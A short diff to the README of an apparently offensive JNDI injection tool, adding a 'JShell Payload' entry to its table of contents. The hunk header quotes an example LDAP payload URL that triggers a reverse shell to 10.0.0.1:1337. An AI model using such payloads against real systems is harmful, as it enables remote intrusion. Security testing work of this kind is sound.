@@ -79,6 +79,7 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - [高级技巧](USAGE.md#高级技巧)
   - [Use Reference Only](USAGE.md#use-reference-only)
   - [Confusing Class Name](USAGE.md#confusing-class-name)
+  - [JShell Payload](USAGE.md#jshell-payload)
 
 ## ⚙️ 编译
 
